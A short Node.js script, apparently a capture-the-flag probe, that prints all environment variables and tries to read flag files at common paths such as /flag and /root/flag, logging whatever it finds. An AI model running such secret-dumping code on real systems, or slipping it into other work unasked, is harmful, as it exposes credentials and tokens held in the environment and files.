const fs = require("fs");

try {
    console.log("=== ENV VARS ===");
    console.log(process.env);

    console.log("=== TRYING COMMON SECRET PATHS ===");

    const paths = [
        "/flag",
        "/root/flag",
        "/app/flag",
        "/home/ctf/flag",
        "/etc/flag"
    ];

    for (const path of paths) {
        try {
            const data = fs.readFileSync(path, "utf8");
            console.log("FOUND FLAG:", data);
        } catch (e) {}
    }
} catch (e) {
    console.log("Error:", e);
}
